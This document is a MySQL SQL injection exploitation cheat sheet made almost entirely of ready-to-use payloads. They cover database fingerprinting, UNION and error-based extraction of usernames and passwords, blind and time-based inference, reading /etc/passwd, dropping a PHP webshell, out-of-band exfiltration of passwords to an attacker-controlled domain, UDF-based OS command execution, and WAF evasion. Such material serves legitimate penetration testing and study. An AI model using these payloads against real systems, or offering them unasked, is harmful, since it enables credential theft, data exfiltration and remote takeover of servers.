# MySQL — SQL Injection Exploitation Cheat Sheet
 
## 1. Fingerprinting & Environment Recon
 
```sql
-- Version
SELECT @@version;
SELECT version();
SELECT @@version_comment;
SELECT @@version_compile_os;
 
-- Current user / privilege context
SELECT current_user();
SELECT user();
SELECT system_user();
 
-- Current database
SELECT database();
SELECT schema();
 
-- Hostname / server info
SELECT @@hostname;
SELECT @@datadir;
 
-- Privilege checks
SELECT @@global.secure_file_priv;              -- empty string = file read/write unrestricted; NULL = fully disabled
SELECT grantee, privilege_type FROM information_schema.user_privileges;
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type = 'FILE';
SELECT super_priv, file_priv FROM mysql.user WHERE user = current_user();
```
 
**Interpretation notes:** `secure_file_priv` is the single most important recon value for later exploitation — an empty string permits `LOAD_FILE()`/`INTO OUTFILE` against any path the OS user can access; a specific directory path restricts file operations to that directory; `NULL` disables file I/O entirely regardless of `FILE` privilege.
 
## 2. Syntax & Comment Dialects
 
```sql
-- Inline comment (requires a trailing space or control character after --)
' AND 1=1-- 
' AND 1=1-- -
' AND 1=1#
 
-- Multi-line comment
' AND/**/1=1
 
-- Version-gated execution comment (MySQL-specific)
-- Executes only if server version >= the 5-digit number; treated as an inert comment by
-- every other DBMS and frequently unparsed by signature-based WAF rules
/*!50000UNION*/ /*!50000SELECT*/ username,password FROM users
 
-- String concatenation
SELECT CONCAT(username,0x3a,password) FROM users;
SELECT CONCAT_WS(0x3a,username,password) FROM users;
-- || is NOT concatenation by default (interpreted as logical OR) unless
-- sql_mode includes PIPES_AS_CONCAT — never assume it is available
```
 
**No dummy table required** — `SELECT 'abc','def'` is valid MySQL syntax with no `FROM` clause.
 
## 3. Schema & Metadata Enumeration
 
```sql
-- List every database on the server
SELECT schema_name FROM information_schema.schemata;
 
-- List tables in the current database
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
 
-- List tables across ALL databases (cross-database visibility check)
SELECT table_schema, table_name FROM information_schema.tables;
 
-- List columns of a specific table
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
SELECT column_name FROM information_schema.columns WHERE table_name = 'users' AND table_schema = 'app_db';
 
-- Row-folding: dump an entire table into a single reflected value
SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x3c62723e) FROM users;
-- 0x3a = ':' and 0x3c62723e = '<br>' as hex literals — avoids quote characters entirely,
-- useful when single/double quotes are filtered
 
-- GROUP_CONCAT truncation (default limit: 1024 bytes via group_concat_max_len)
-- Raise the limit within the same session if stacked queries are available:
SET SESSION group_concat_max_len = 18446744073709551615;
-- If truncation persists (stacked queries unavailable), paginate manually:
SELECT GROUP_CONCAT(username,0x3a,password) FROM users LIMIT 10 OFFSET 0;
SELECT GROUP_CONCAT(username,0x3a,password) FROM users LIMIT 10 OFFSET 10;
```
 
## 4. In-Band Exploitation (UNION & Error-Based)
 
```sql
-- NULL probing for column count
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
 
-- Confirmed 3-column numeric/string mix
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
 
-- Error-based extraction via EXTRACTVALUE (XPath syntax error abuse)
-- Output truncated to 32 characters — chain with SUBSTRING for longer values
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM users WHERE username='administrator'))) --
 
-- Error-based extraction via UPDATEXML (same 32-character truncation)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1) --
 
-- Classic GROUP BY duplicate-entry error-based extraction
-- (works even when EXTRACTVALUE/UPDATEXML are patched or filtered)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```
 
## 5. Blind & Inferential Payloads
 
```sql
-- Boolean-based
' AND 1=1--
' AND 1=2--
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--
 
-- Conditional logic
' AND IF(1=1,SLEEP(0),SLEEP(5))--
' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--
 
-- Time-based
' AND SLEEP(5)--
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a',SLEEP(5),SLEEP(0))--
 
-- Heavy-query alternative to SLEEP() (useful if SLEEP is filtered/disabled)
' AND BENCHMARK(5000000,SHA1(1))--
```
 
## 6. Stacked Queries & Out-of-Band (OAST)
 
```
Stacked query support: NOT reliable by default. Most PHP mysqli (single mysqli_query())
and PDO (default settings) submit exactly one statement per call and will error or
silently ignore anything after a semicolon. Only applications explicitly using
mysqli_multi_query() or PDO::MYSQL_ATTR_MULTI_STATEMENTS will execute stacked queries —
always test empirically with a harmless second statement rather than assuming support.
```
 
```sql
-- File read (requires FILE privilege + secure_file_priv not NULL)
' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--
 
-- File write / webshell drop (requires FILE privilege + known writable web path)
' UNION SELECT '<?php system($_GET["c"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'--
 
-- OOB via UNC path (Windows MySQL servers only) — triggers an SMB/DNS lookup
-- that can carry exfiltrated data as part of the path
' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker-controlled-domain\\\\a')),2,3--
 
-- RCE via UDF injection (requires FILE privilege + writable plugin_dir)
-- 1. Write a malicious shared library (sys_exec/sys_eval UDF) to the plugin directory via INTO OUTFILE/DUMPFILE
-- 2. Register the function:
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
-- 3. Execute arbitrary OS commands:
SELECT sys_exec('id > /tmp/out; chmod 666 /tmp/out');
```
 
## 7. WAF Evasion & DBMS-Specific Quirks
 
```sql
-- Whitespace alternatives
' UNION%0aSELECT%0a1,2,3--
' UNION%09SELECT%091,2,3--
' UNION/**/SELECT/**/1,2,3--
' UNION(SELECT(1),(2),(3))--   -- parentheses eliminate the need for spaces entirely
 
-- Inline comment keyword splitting (defeats contiguous-substring signature matches)
' UNI/**/ON SEL/**/ECT 1,2,3--
 
-- Version-gated comment bypass (invisible to parsers that don't implement MySQL's dialect)
'/*!50000UNION*/+/*!50000SELECT*/+1,2,3--
 
-- Case variation (defeats case-sensitive signature rules only)
' uNiOn SeLeCt 1,2,3--
 
-- Scientific-notation numeric literal trick — "1e0" parses as a valid number,
-- allowing UNION to immediately follow with no separating space
' 1e0union select 1,2,3--
 
-- Quote-character avoidance via hex literals and UNHEX()
SELECT UNHEX('61646D696E');          -- evaluates to the string 'admin' with zero quote characters
' AND username=0x61646d696e--        -- 0x-prefixed hex literal used directly as a string value
```
 
